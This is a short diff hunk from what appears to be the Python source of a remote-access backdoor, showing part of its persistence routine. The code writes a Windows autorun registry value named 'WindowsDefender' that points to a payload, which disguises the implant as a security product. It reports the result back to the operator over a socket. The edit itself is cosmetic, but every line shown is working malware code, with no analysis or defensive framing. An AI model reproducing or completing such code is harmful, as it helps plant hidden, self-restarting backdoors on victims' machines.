@@ -142,7 +142,7 @@ def persistance(sock):
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE)
                 winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, t_path)
                 winreg.CloseKey(key)
-                send(sock, f"[+] Registry persistence succeeded".encode())
+                send(sock, b"[+] Registry persistence succeeded")
             except Exception as reg_error:
                 send(sock, f"[!] Registry persistence failed: {reg_error}".encode())
         elif arc.lower() == "linux":
